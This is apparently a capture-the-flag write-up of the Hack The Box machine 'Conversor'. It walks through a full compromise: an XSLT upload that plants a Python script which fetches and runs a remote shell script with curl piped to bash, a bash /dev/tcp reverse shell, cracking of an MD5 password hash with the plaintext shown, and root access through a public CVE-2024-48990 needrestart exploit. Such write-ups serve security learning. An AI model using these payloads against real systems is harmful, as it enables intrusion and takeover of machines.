---
title: "Conversor"
date: 27-10-2025
categories: [Linux, Linux Easy, Active]
tags: [Scripts, CVE, XML, XSLT, Source Code]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0b659c391f2803c247e79c77a3284f96.png
---

Conversor is an easy Linux machine from Hack The Box. Foothold is a bit tricky if you are unfamiliar with XML and skip over small details. We get a page which converts XML data into a nice looking website, the site also gives us the source code to the site which shows an `INSTALL.md` file that reveals that the server is executing python scripts from a certain directory. Using an XMLT file a python script is uploaded and we get a reverse shell as `www-data`, inside the server we can read the database from where we can get another user's password. This user can SSH into the box and can run an outdated binary as sudo. Using a public POC we can get root.

![alt text](/assets/images/conversor/Conversor.png)

We can start as always with an nmap scan which reveals two open ports, port 22 for SSH and port 80, which hosts a website. 
```
nmap -Pn 10.129.80.15 -sCV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-27 16:54 CET
Nmap scan report for conversor.htb (10.129.80.15)
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```

From the nmap scan we can see that the website is trying to redirect us to `conversor.htb` we can add this entry into our host file to access the page.
![alt text](/assets/images/conversor/front.png)

Since we do no have a valid account we can register one on the `/register` endpoint, we can then use the credentials on the `/login` page and we gain access to the home page.
![alt text](/assets/images/conversor/home.png)
We can see that the page is designed for the user to upload an XML and XSLT file and the server will render a nice webpage. We will use this later on but first lets take a look at the `/about` endpoint. 
![alt text](/assets/images/conversor/about.png)
We can see that the project is open source and they give us a download link to a tar file containing the compressed source code of the app. After downloading it we can extract it using `tar`

```sh
ls
source_code.tar.gz

file source_code.tar.gz 
source_code.tar.gz: POSIX tar archive (GNU)

tar -xf source_code.tar.gz

ls
app.py  app.wsgi  install.md  instance  scripts  source_code.tar.gz  static  templates  uploads
```

If we read the `install.md` file we can see that the server seem to be executing every python script inside the `scripts` directory every minute as the `www-data` user.
```
cat install.md 
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

The file also revealed the working directory of the web server which is `/var/www/convesor.htb/`. If we cat the `app.py` file we can see that it parses the `xslt` and executes it.
```python
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

We can see that the code does not have a lot of safeguards in place. I used this to upload a python script which would download a bash shell form my system and execute it. I used the following `xslt` file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
<xsl:template match="/">
<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.125:443/shell.sh|bash")
</shell:document>
</xsl:template>
</xsl:stylesheet>
```

For the xml file I just ran the same nmap scan as before but making it output the results in xml format:
```
nmap -Pn 10.129.80.15 -sCV -oX scan.xml
```

To set up I made the `shell.sh` script which is the script being downloaded by the xslt file. It contains the following code:
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.131/9001 0>&1
```

I then started my python server to listen for any web requests and my netcat listener to get the reverse shell connection
```
sudo python3 -m http.server 443
```
```
nc -vlnp 9001
```

I then uploaded the two files, `scan.xml` and `shell.xslt` and waiting for a minute. After some time I see that the bash script was downloaded and immediately executed giving me a shell as `www-data`:
```
sudo python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
10.129.80.15 - - [27/Oct/2025 17:55:49] "GET /shell.sh HTTP/1.1" 200 -
```
```
nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.80.15 44408
bash: cannot set terminal process group (7629): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$ 
```

In the source code that we downloaded earlier I saw that the application uses an sqlite3 database, reading the database shows that there is another user appart from me, this other user also has a home folder in the server, which suggests that they have the same password.

```
www-data@conversor:~/conversor.htb$ cd instance
cd instance
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
sqlite3 users.db
select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
<SNIP>
```

The password hash is in md5 format which is a very weak hashing algorithm, the hash cracks instantly using hashcat:
```
hashcat 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt -m 0
hashcat (v6.2.6) starting

<SNIP>

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
Time.Started.....: Mon Oct 27 18:02:38 2025 (8 secs)
Time.Estimated...: Mon Oct 27 18:02:46 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1393.8 kH/s (0.12ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10974720/14344385 (76.51%)
Rejected.........: 0/10974720 (0.00%)
Restore.Point....: 10973184/14344385 (76.50%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: KeishayYashi -> KayanP75
Hardware.Mon.#1..: Util: 26%

Started: Mon Oct 27 18:02:37 2025
Stopped: Mon Oct 27 18:02:47 2025
```

Using this password I ssh'ed as fismathack on `conversor.htb`
```
ssh fismathack@conversor.htb
fismathack@conversor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

<SNIP>
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

We can see that the user can run the `needrestart` binary as the sudo user. A quick google search shows that this binary has been vulnerable to a privilege escalation vulnerability. Checking the version of the installed binary shows that it is still vulnerable.
```
fismathack@conversor:~$ /usr/sbin/needrestart --version

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later versio
```

The specific CVE is CVE-2024-48990 more details about it can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2024-48990), the vulnerability affects version up to 3.7 which is our current version, searching for a public proof of concept online I was able to find [this one](https://github.com/makuga01/CVE-2024-48990-PoC) the target system does not have gcc so I compiled the exploit locally and then transferred it using a python server.

```
git clone https://github.com/makuga01/CVE-2024-48990-PoC.git
cd CVE-2024-48990-PoC/

gcc -shared -fPIC -o "$PWD/__init__.so" lib.c

sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.80.15 - - [27/Oct/2025 18:12:53] "GET /__init__.so HTTP/1.1" 200 -
10.129.80.15 - - [27/Oct/2025 18:13:45] "GET /e.py HTTP/1.1" 200 -
```

On the target I downloaded the `e.py` and the compiled python library.
```
wget http://10.10.14.131/__init__.so
wget http://10.10.14.131/e.py
```

```sh
fismathack@conversor:~$ chmod +x __init__.so 
fismathack@conversor:~$ mkdir -p "$PWD/importlib"
fismathack@conversor:~$ mv __init__.so importlib/
fismathack@conversor:~$ PYTHONPATH="$PWD" python3 e.py
Error processing line 1 of /usr/lib/python3/dist-packages/zope.interface-5.4.0-nspkg.pth:

  Traceback (most recent call last):
    File "/usr/lib/python3.10/site.py", line 192, in addpackage
      exec(line)
    File "<string>", line 1, in <module>
  ImportError: dynamic module does not define module export function (PyInit_importlib)

Remainder of file ignored
##########################################

Don't mind the error message above

Waiting for needrestart to run...
```

Seems like it is working so i start another ssh connection and I run the binary as sudo:
```
ssh fismathack@conversor.htb
fismathack@conversor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

<SNIP>

fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
fismathack@conversor:~$ sudo /usr/sbin/needrestart
Scanning processes...                                                                                                                                                                         
Scanning linux images...                                                                                                                                                                      

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

Checking on the other ssh terminal, we see that the exploit worked and we are root!
```
Waiting for needrestart to run...
Got the shell!
# id 
uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack)
```